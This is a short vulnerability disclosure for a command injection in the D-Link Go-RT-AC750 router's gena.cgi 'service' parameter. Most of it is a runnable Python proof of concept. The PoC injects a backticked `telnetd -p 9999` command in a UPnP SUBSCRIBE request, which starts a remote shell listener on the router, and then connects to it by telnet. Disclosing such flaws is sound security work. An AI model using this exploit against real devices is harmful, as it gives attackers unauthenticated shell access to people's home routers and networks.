# Go-RT-AC750 Command Injection Vulnerability

## General Information

Vendor: D-Link

Affected Product: Go-RT-AC750

Firmware version: revA_v101b03

Vendor Homepage: https://www.dlink.com/en/consumer

## Vulnerability description

D-Link Go-RT-AC750 revA_v101b03 was discovered to contain a command injection vulnerability via the service parameter at genacgi_main.

## PoC

```python
from socket import *
from os import *
from time import *

request = b"SUBSCRIBE /gena.cgi?service=`telnetd -p 9999` HTTP/1.1\r\n"
request += b"Host: 192.168.0.1:49152\r\n"
request += b"NT: upnp:event\r\n"
request += b"Callback: <http://192.168.0.1/>\r\n"
request += b"Timeout: Second-1800\r\n\r\n"
 
s = socket(AF_INET, SOCK_STREAM)
s.connect((gethostbyname("192.168.0.1"), 49152))
s.send(request)
 
sleep(10)
system('telnet 192.168.0.1 9999')
```

![image-20230531134402664](https://raw.githubusercontent.com/Tyaoo/PicBed/master/img/202305311344919.png)